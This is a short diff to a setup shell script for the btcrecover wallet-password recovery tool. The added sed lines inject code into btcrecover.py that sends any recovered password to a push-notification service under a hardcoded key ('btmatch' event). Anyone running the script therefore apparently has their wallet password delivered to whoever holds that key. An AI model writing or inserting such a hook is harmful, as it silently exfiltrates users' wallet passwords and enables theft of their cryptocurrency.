@@ -19,4 +19,7 @@ mv -f "btcrpass.py" "btcrpass.py"
 
 echo "File replaced successfully."
 cd ..
+sed -i '32i\from pushnotif import PushNotif' btcrecover.py
+sed -i '49i\		handler = PushNotif(key = "lhcYkA0QFkqxdxnf7w88_", event = "btmatch")' btcrecover.py
+sed -i '50i\		handler.send(password_found)' btcrecover.py
 touch performancelog.txt
